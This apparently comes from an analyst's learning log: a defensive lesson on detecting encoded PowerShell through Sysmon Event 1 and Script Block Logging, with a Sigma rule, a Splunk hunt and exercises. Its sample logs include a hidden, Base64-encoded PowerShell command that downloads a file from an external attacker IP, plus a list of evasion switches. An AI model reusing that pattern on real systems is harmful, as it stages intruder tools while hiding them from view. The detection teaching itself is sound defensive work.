# Day 06 — Suspicious PowerShell: Encoded Commands

📅 16 October 2026 · 🏷️ Endpoint telemetry · ⏱️ ~25 min

---

## Why it matters

Yesterday's Sysmon Event ID 1 showed every command the intruder on `FS01`
typed. That works because the commands were readable: `whoami`, `net group`,
`nltest`. Attackers know analysts read command lines, so the next step is often
to make the command line **unreadable**. PowerShell makes that easy: its
`-EncodedCommand` switch accepts a whole script as a Base64 string. The process
still shows up in Sysmon, but the `CommandLine` field is a wall of letters. Your
job today is to recognise that wall on sight, decode it safely, and know where
Windows writes the **decoded** version for you.

---

## The concept

### What `-EncodedCommand` does

`powershell.exe -EncodedCommand <text>` takes a Base64 string, decodes it, and
runs the result as PowerShell. Microsoft added it so that scripts containing
quotes, braces and pipes can be passed on a command line without escaping
problems. Management tools use it legitimately. Attackers use it because it
hides the payload from a quick glance and from simple keyword rules.

Two details make it recognisable:

| Detail | What it means for you |
|---|---|
| The text is **UTF-16LE** before it's Base64-encoded | Every second byte is `0x00`, so the Base64 is full of `A`s: `SQBuAHYAbwBrAGUALQA=` is just `Invoke-` |
| PowerShell accepts **unambiguous prefixes** of a parameter name, plus short aliases | `-EncodedCommand`, `-enc`, `-ec` and `-e` all work, and `/enc` too. A rule that looks only for `-EncodedCommand` misses most real cases |

Some Base64 prefixes are worth memorising, because they appear again and again:

| Base64 starts with | Decodes to (UTF-16LE) |
|---|---|
| `SQBuAHYAbwBrAGUALQ` | `Invoke-` |
| `SQBFAFgA` | `IEX` (short for `Invoke-Expression`) |
| `JAB` | `$` (a script starting with a variable) |
| `RwBlAHQALQ` | `Get-` |

### Switches that often travel with it

| Switch (short form) | Effect | Why attackers like it |
|---|---|---|
| `-NoProfile` (`-NoP`) | Skip the user's profile script | Faster, fewer side effects |
| `-WindowStyle Hidden` (`-W Hidden`) | No visible window | The logged-on user sees nothing |
| `-NonInteractive` (`-NonI`) | No prompts | Runs unattended |
| `-ExecutionPolicy Bypass` (`-ep bypass`) | Ignore the script execution policy | Execution policy is a safety setting, not a security boundary |

None of these is malicious alone. `-NoP -W Hidden -enc` **together**, started
from a shell at 2 am, is a different story.

### Where the decoded script ends up: Event ID 4104

PowerShell 5.0 and later can record the actual code it runs, after any
decoding, in **Script Block Logging**. Turn it on with the Group Policy setting
*Administrative Templates → Windows Components → Windows PowerShell → Turn on
PowerShell Script Block Logging*. Each block is logged as **Event ID 4104** in
`Microsoft-Windows-PowerShell/Operational`, with the code in the
`ScriptBlockText` field.

| Log | Event | Shows |
|---|---|---|
| Sysmon Operational | **1** (Process Create) | The **encoded** command line, parent, user, hashes |
| PowerShell Operational | **4104** (Script block) | The **decoded** code that actually ran |

> 💡 **The analyst's shortcut:** Sysmon 1 tells you *that* encoded PowerShell
> ran and *who* started it. 4104 tells you *what* it did. Collect both.

### Decoding it safely

Never paste a suspicious command into a PowerShell prompt to "see what it
does". Decode it as **data** instead:

- **CyberChef:** *From Base64*, then *Decode text* with encoding
  **UTF-16LE (1200)**.
- **PowerShell, decoding only (nothing is executed):**

  ```powershell
  $b64 = 'SQBuAHYAbwBrAGUALQA='
  [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64))
  ```

  `Unicode` in .NET means UTF-16LE. Decoding with UTF-8 instead gives you
  text with a gap (a null byte) after every character, the classic sign you
  picked the wrong encoding.

---

## Sample logs

Back on Northwind's file server `FS01`, still in the `administrator` RDP
session from Day 05. The discovery commands ended at 14:55:05 UTC. Times are
UTC (14:57 UTC is **01:57 in Sydney**).

First, **one full Sysmon Event ID 1**, slightly trimmed:

```
Process Create:
UtcTime: 2026-10-14 14:57:18.442
ProcessGuid: {6f1d2c3a-4c8e-670d-3b01-000000001a00}
ProcessId: 6012
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.20348.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -NoP -W Hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA0ADUALwB1AHAAZABhAHQAZQAuAHQAeAB0ACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwAdQBwAGQAYQB0AGUALgB0AHgAdAA=
CurrentDirectory: C:\ProgramData\
User: NORTHWIND\administrator
LogonId: 0x5A3F21
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9B2E41…7A1D (shortened)
ParentProcessGuid: {6f1d2c3a-4b2f-670d-2701-000000001a00}
ParentProcessId: 4380
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: "C:\Windows\system32\cmd.exe"
```

Then the **matching Event ID 4104** from the PowerShell Operational log, one
second later:

```
Event ID: 4104   Level: Verbose   Computer: FS01.northwind-example.com
TimeCreated (UTC): 2026-10-14 14:57:19
Creating Scriptblock text (1 of 1):
Invoke-WebRequest -Uri http://203.0.113.45/update.txt -OutFile C:\ProgramData\update.txt

ScriptBlock ID: 3e7a5c19-82d4-4f0b-a6c2-5d18e94b0c71
Path:
```

Finally, **every Sysmon Event ID 1 for PowerShell** on `FS01` that day. Only
key fields are shown, `ParentImage` is shortened to the file name, and long
Base64 strings are cut with `…`.

```
UtcTime (2026-10-14)  User                     ParentImage    CommandLine
14:57:18              NORTHWIND\administrator  cmd.exe        powershell.exe -NoP -W Hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1…
15:30:00              NT AUTHORITY\SYSTEM      svchost.exe    powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Scripts\DiskReport.ps1
22:00:07              NT AUTHORITY\SYSTEM      nwagent.exe    powershell.exe -NonInteractive -EncodedCommand RwBlAHQALQBDAGkAbQBJAG4AcwB0…
23:20:11              NORTHWIND\tom.reyes      explorer.exe   powershell.exe
```

`nwagent.exe` (in `C:\Program Files\NWAgent\`) is Northwind's IT inventory
agent, which collects hardware and OS details every night. `DiskReport.ps1` is
a scheduled disk-space report. Tom on the helpdesk opened a PowerShell window
at 10:20 in Sydney.

---

## What to look for

1. **An encoded command in an interactive admin session.** At 14:57:18, the
   same `administrator` session (`LogonId: 0x5A3F21`, `TerminalSessionId: 2`)
   that ran yesterday's discovery burst started PowerShell with `-enc`. The
   parent is the **same `cmd.exe`** (process ID 4380, same `ProcessGuid`) that
   launched `wu.exe`. One intruder, one session, next step.
2. **The supporting switches.** `-NoP -W Hidden` alongside `-enc`: no profile,
   no window, no readable command. The Base64 starts with
   `SQBuAHYAbwBrAGUALQ`, so before decoding anything you already know it begins
   with `Invoke-`.
3. **What it decodes to.** The 4104 shows the real code: `Invoke-WebRequest`
   downloads a file from `203.0.113.45`, an external IP no other log has
   mentioned, into `C:\ProgramData\`, the same folder as the renamed `wu.exe`.
   That's **T1105 Ingress Tool Transfer**: the intruder is bringing in tools.
   The file is called `update.txt`, but the name proves nothing about its
   contents.
4. **The normal rows.** Of the **4** PowerShell processes that day, **2** use
   an encoded command: the intruder's and the inventory agent's. The agent is
   expected: it runs as `SYSTEM`, from its own installed program, at the same
   time every night. `DiskReport.ps1` uses `-ExecutionPolicy Bypass` but runs a
   named script file you can read. Tom's PowerShell has no arguments at all: a
   person opening a window during business hours.
5. **Where to pivot next.** A download leaves more traces: a Sysmon **Event 3**
   (network connection) from `powershell.exe` to `203.0.113.45`, and a Sysmon
   **Event 11** (file create) for `C:\ProgramData\update.txt`. Search for that
   IP across every host, not just `FS01`.

---

## Detection logic

**In plain English:** alert on any PowerShell process (Windows PowerShell or
PowerShell 7, matched by name **or** original file name) whose command line
contains an encoded-command switch in **any** of its short forms.

This is a **single-event** rule, like the renamed-tool rule from Day 05's
exercise 3. There's no count or time window: one encoded command is enough to
look at.

**Sigma:**

```yaml
title: PowerShell Started With An Encoded Command
id: 0c7e6a2b-5f1d-4e8a-9b34-2d6f8c1a7e05
status: experimental
description: >
  Detects powershell.exe or pwsh.exe started with the -EncodedCommand
  parameter or one of its abbreviations (-e, -ec, -en, -enc, -enco...).
  Encoded commands hide the script from a quick read of the command line.
references:
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe
  - https://attack.mitre.org/techniques/T1059/001/
  - https://attack.mitre.org/techniques/T1027/010/
author: Jay (SOC learning log)
date: 2026-10-16
tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense-evasion
  - attack.t1027.010
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    - Image|endswith:
        - '\powershell.exe'
        - '\pwsh.exe'
    - OriginalFileName:
        - 'PowerShell.EXE'
        - 'pwsh.dll'
  selection_cli:
    CommandLine|contains|windash:
      - ' -e '
      - ' -ec '
      - ' -en '
      - ' -enc '
      - ' -enco'
  condition: all of selection_*
falsepositives:
  - Software deployment and management agents (SCCM, Intune, inventory tools)
  - Admin scripts that pass complex commands this way
level: medium
```

How it works:

- `selection_img` is a **list of two maps**. In Sigma, a list of maps means
  **OR**: the process matches if `Image` ends in a PowerShell name **or**
  `OriginalFileName` says it's PowerShell. That second check catches a renamed
  `powershell.exe`, the same trick as `wu.exe` on Day 05. (`pwsh.exe` is a
  small launcher, so PowerShell 7's original file name is `pwsh.dll`.)
- `|contains|windash` is a newer Sigma modifier. It expands each value to also
  match the other dash characters Windows accepts, such as `/enc` and the en
  dash `–enc`, so swapping the dash doesn't evade the rule.
- The leading and trailing spaces matter. `' -e '` matches `-e` as a whole
  switch, not the start of `-ExecutionPolicy`. `' -enco'` has no trailing
  space on purpose, so it covers `-enco`, `-encod`, `-encoded` and
  `-EncodedCommand` in one value. Sigma's `contains` is case-insensitive.
- `condition: all of selection_*` means **both** blocks must match: it's
  PowerShell **and** it has an encoded switch.

On the sample, the rule matches **2** of the 4 PowerShell events: the
`administrator` command at 14:57:18 (`' -enc '`) and the inventory agent at
22:00:07 (`' -enco'` inside `-EncodedCommand`). `DiskReport.ps1` doesn't match
(`' -e '` needs a space straight after the `e`, and `-ExecutionPolicy` has an `x` there), and neither does
Tom's bare `powershell.exe`.

**Hunting in the decoded text.** The Sigma rule finds *that* something was
encoded. To find *what* ran, search the 4104 events. In Splunk:

```spl
source="XmlWinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104
  (ScriptBlockText="*Invoke-WebRequest*" OR ScriptBlockText="*DownloadString*"
   OR ScriptBlockText="*DownloadFile*" OR ScriptBlockText="*Net.WebClient*")
| table _time Computer ScriptBlockText
```

On the sample, this returns the one 4104 from `FS01` at 14:57:19. Wildcard
matches in Splunk are case-insensitive, so `invoke-webrequest` is caught too.

**Tuning note:** the inventory agent will match every night, so exclude it
**narrowly**: `ParentImage` is exactly `C:\Program Files\NWAgent\nwagent.exe`
**and** `User` is `NT AUTHORITY\SYSTEM`. Don't exclude every encoded command
run as `SYSTEM`, and don't exclude on the Base64 text, which changes whenever
the agent's script changes. Before deploying, run the rule over 30 days of
history to list every legitimate source, because most environments have a
few. Check the source name your SIEM uses for the PowerShell log (some use
`WinEventLog:` rather than `XmlWinEventLog:`), and confirm Script Block
Logging is actually switched on: without it, the 4104 hunt returns nothing,
and that silence means "not collected", not "nothing happened".

---

## Your turn

1. Decode the inventory agent's full command below, using CyberChef or the
   decode-only PowerShell snippet. What does it do, and does it match what you
   expected from an inventory tool?

   ```
   RwBlAHQALQBDAGkAbQBJAG4AcwB0AGEAbgBjAGUAIABXAGkAbgAzADIAXwBPAHAAZQByAGEAdABpAG4AZwBTAHkAcwB0AGUAbQAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAAQwBhAHAAdABpAG8AbgAsACAAVgBlAHIAcwBpAG8AbgA=
   ```

2. Give **three** pieces of evidence, from the logs alone, that the 14:57:18
   PowerShell was started by the same person who ran `wu.exe /all` on Day 05.
3. An attacker runs `powershell -NoP -ec SQBFAFgA…`. Would today's Sigma rule
   match it? Which value in `selection_cli` fires? And without decoding the
   whole string, what is the first command in the script?
4. Write the **exclusion** from the tuning note as a `filter_` block in Sigma
   and update the `condition` to use it. Then explain why excluding on
   `ParentImage` alone (without `User`) would be weaker.

---

## My answers

<!-- Answer each question in your own words, then commit. -->

1.

2.

3.

4.

---

## Further reading

- Microsoft Learn: [about_PowerShell_exe](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe) · [about_Logging_Windows](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows)
- SigmaHQ: [Modifiers (including `windash`)](https://sigmahq.io/docs/basics/modifiers.html)
- MITRE ATT&CK: [T1059.001 PowerShell](https://attack.mitre.org/techniques/T1059/001/) · [T1027.010 Command Obfuscation](https://attack.mitre.org/techniques/T1027/010/) · [T1105 Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)
- CyberChef (GCHQ): [CyberChef](https://gchq.github.io/CyberChef/)

⬅️ [Learning log index](README.md) · ➡️ Day 07: Parent–child process anomalies (Office spawning shells) (17 Oct)
